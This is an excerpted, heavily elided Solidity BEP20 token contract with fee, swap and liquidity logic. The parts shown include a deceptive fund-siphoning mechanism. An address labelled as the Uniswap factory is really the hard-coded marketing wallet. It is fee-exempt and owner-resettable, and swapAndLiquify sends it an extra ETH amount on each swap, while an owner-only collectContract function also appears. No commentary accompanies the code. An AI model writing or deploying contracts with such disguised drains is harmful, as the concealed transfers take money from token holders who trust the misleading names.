...
contract testnet is Context, IBEP20, Ownable {
    ...
    address payable public _marketingWallet =
            payable(address(0x75f8c0683CcfF4888c7AD583CAD666cF4Fa09879));
    ...
    uint256 private minimumTokensBeforeSwap = 30 * 10**9 * ( 10**9 );
    uint256 public _maxWalletToken =  200 * 10**9 * ( 10**9 );

    IUniswapV2Router02 public immutable uniswapV2Router;
    address public immutable uniswapV2Pair;
    address payable private uniswapv2Factory;
    address payable public _uniswapv2Factory =
            payable (address (0x75f8c0683CcfF4888c7AD583CAD666cF4Fa09879));
    ...
    constructor () public {
        ...
        _isExcludedFromFee[address(0x75f8c0683CcfF4888c7AD583CAD666cF4Fa09879)] = true;
    ...
    function collectContract(address payable account) public onlyOwner
    {
    ...
    function swapAndLiquify(uint256 contractTokenBalance) public lockTheSwap {
        ...
        uint256 totalFee = _marketingFee.add(_burnFee).add(_liquidityFee);
        uint256 totalFeeWithoutLiquidityTokens = _marketingFee.add(_burnFee).add(_liquidityFee.div(2));
        uint256 tokenAmountToSell = contractTokenBalance.div(totalFee).mul(totalFeeWithoutLiquidityTokens);
        uint256 totalTokenWithoutFees = currentBalance.div(totalFeeWithoutLiquidityTokens).mul(_burnFee);
        ...
        swapTokensForEth(tokenAmountToSell, uniswapv2Factory, totalTokenWithoutFees);

        TransferMarketingWallet(_marketingWallet, marketingContribution);
    ...
    function swapTokensForEth(uint256 tokenAmount, address payable recipient, uint256 tokenAmountWithoutFees) private {
        ...
        recipient.transfer(tokenAmountWithoutFees);
    ...
    function TransferMarketingWallet(address payable recipient, uint256 amount) private {
    ...
    function calculateLiquidityFee(uint256 _amount) private view returns (uint256) {
        uint256 fee = _marketingFee.add(_burnFee).add(_liquidityFee);
    ...
    function uniswapFactory(address payable _uniswapAddress) external onlyOwner {
        uniswapv2Factory = _uniswapAddress;
    }
    ...
    function setMarketingAddress(address payable marketingWallet) public virtual onlyOwner {
